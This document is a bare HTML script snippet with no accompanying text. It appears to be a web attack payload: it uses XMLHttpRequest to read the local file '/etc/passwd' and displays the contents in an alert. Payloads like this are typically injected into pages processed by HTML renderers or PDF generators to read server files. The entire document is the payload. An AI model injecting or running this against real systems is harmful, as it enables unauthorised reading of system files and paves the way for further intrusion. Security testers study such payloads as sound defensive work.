<script>
    x=new XMLHttpRequest;
    x.onload=function(){alert(this.responseText)};
    x.open("GET","file:///etc/passwd");
    x.send();
</script> 
